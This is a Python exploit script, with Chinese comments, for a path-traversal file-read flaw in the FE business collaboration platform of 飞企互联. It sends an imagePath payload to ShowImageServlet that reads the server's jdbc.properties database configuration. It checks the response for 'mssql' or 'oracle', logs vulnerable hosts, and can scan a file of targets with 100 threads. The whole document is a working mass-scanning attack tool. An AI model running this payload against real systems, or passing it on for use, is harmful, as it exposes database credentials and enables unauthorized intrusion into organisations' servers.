# 飞企互联 FE 业务协作平台 magePath 参数文件读取漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test = '''

                ███╗   ███╗ █████╗  ██████╗ ███████╗██████╗  █████╗ ████████╗██╗  ██╗
                ████╗ ████║██╔══██╗██╔════╝ ██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██║  ██║
                ██╔████╔██║███████║██║  ███╗█████╗  ██████╔╝███████║   ██║   ███████║
                ██║╚██╔╝██║██╔══██║██║   ██║██╔══╝  ██╔═══╝ ██╔══██║   ██║   ██╔══██║
                ██║ ╚═╝ ██║██║  ██║╚██████╔╝███████╗██║     ██║  ██║   ██║   ██║  ██║
                ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝
                                                                                        author:秋妤
                                                                                        date:2024.09.21
                                                                                        version:1.0
    '''
    print(test)

def poc(target):
    headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
    "Accept-Encoding": "gzip",}
    payload = "/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print"
    rsp1 = requests.get(url=target,verify=False)
    if rsp1.status_code == 200:
        rsp2 = requests.get(url=target+payload,headers=headers,verify=False)
        if 'mssql' in rsp2.text or 'oracle' in rsp2.text:
            print(f'[+]{target}存在参数读取')
            with open('飞企_result.txt','a') as f:
                f.write(target+'\n')
        else:
            print(f'[-]{target}不存在参数读取')
    else:
        print(f'[-]{target}可能存在问题，请手工测试')


def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description = "这是一个关于飞企互联 FE 业务协作平台 magePath 参数文件读取漏洞的脚本")
    parser.add_argument("-u", "--url", dest = "url", help = "Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter your file")

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()